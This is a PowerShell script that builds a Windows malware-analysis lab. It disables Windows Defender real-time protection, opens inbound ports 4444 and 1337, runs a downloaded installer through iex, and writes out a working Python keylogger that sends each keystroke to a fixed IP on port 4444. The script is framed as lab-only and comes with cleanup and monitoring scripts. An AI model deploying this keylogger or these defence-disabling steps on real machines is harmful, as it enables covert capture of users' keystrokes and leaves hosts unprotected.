# Security Warning: Run this only in an isolated lab environment
# Requires Admin privileges
Set-ExecutionPolicy Bypass -Scope Process -Force

# Lab Configuration
$labBase = "C:\CyberLab"
$pythonVersion = "3.12.1"
$testIP = "192.168.1.100"

function Initialize-Lab {
    param(
        [string]$LabPath,
        [string]$PythonVersion
    )

    # Create lab structure
    $dirs = @(
        "$LabPath\Malware_Samples",
        "$LabPath\Network_Traffic",
        "$LabPath\Victim_Files",
        "$LabPath\Tools",
        "$LabPath\Test_Directories\ransomware_test",
        "$LabPath\Test_Directories\keylogger_test",
        "$LabPath\Test_Directories\worm_test"
    )

    $dirs | ForEach-Object {
        New-Item -Path $_ -ItemType Directory -Force | Out-Null
    }

    # Create test files
    1..5 | ForEach-Object {
        New-Item -Path "$LabPath\Test_Directories\ransomware_test\file$_.test" -ItemType File
        New-Item -Path "$LabPath\Test_Directories\keylogger_test\test$_.txt" -ItemType File
    }

    # Install required system features
    Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V-All -All -NoRestart
    Enable-WindowsOptionalFeature -Online -FeatureName Containers -All -NoRestart
}

function Install-LabDependencies {
    # Install Chocolatey
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

    # Install Python
    choco install python --version $pythonVersion -y
    refreshenv

    # Install Python packages
    python -m pip install --upgrade pip
    python -m pip install keyboard paramiko cryptography pyautogui psutil

    # Install networking tools
    choco install wireshark nmap -y
}

function Configure-Firewall {
    # Allow lab network traffic
    New-NetFirewallRule -DisplayName "Lab_TCP" -Direction Inbound -LocalPort 4444,1337,443 -Protocol TCP -Action Allow
    New-NetFirewallRule -DisplayName "Lab_UDP" -Direction Inbound -LocalPort 4444,1337,443 -Protocol UDP -Action Allow

    # Disable Windows Defender for lab (temporary)
    Set-MpPreference -DisableRealtimeMonitoring $true
    Write-Host "[!] Windows Defender real-time protection disabled for lab"
}

function Create-ExampleFiles {
    # Create sample keylogger.py
    @"
import keyboard
import socket

HOST = '$testIP'
PORT = 4444

def key_handler(event):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.sendall(event.name.encode())

keyboard.on_press(key_handler)
keyboard.wait()
"@ | Out-File "$labBase\Malware_Samples\demo_keylogger.py"

    # Create safety wrapper scripts
    Create-SafetyScripts
}

function Create-SafetyScripts {
    # Create lab reset script
    @"
# Lab Cleanup Script
Remove-Item -Path "$labBase" -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring `$false
Get-NetFirewallRule -DisplayName "Lab_*" | Remove-NetFirewallRule
"@ | Out-File "$labBase\Tools\LabReset.ps1"

    # Create network monitor
    @"
# Network Monitor
& "C:\Program Files\Wireshark\tshark.exe" -i Ethernet0 -f "tcp port 4444 or 443" -w "$labBase\Network_Traffic\lab_capture.pcapng"
"@ | Out-File "$labBase\Tools\StartMonitoring.ps1"
}

# Main execution
try {
    Write-Host "=== Cyber Lab Setup ==="
    Initialize-Lab -LabPath $labBase -PythonVersion $pythonVersion
    Install-LabDependencies
    Configure-Firewall
    Create-ExampleFiles

    Write-Host @"
=== Lab Setup Complete ===
Lab Location: $labBase
Test IP: $testIP
Python Version: $(python --version)

Safety Scripts:
- LabReset.ps1: $labBase\Tools\LabReset.ps1
- StartMonitoring.ps1: $labBase\Tools\StartMonitoring.ps1

Next Steps:
1. Review created files
2. Test Python environments
3. Start monitoring script
4. Begin controlled experiments

WARNING: This environment is intentionally vulnerable!
Do NOT use for real systems or sensitive data.
"@
}
catch {
    Write-Host "Error during setup: $_"
}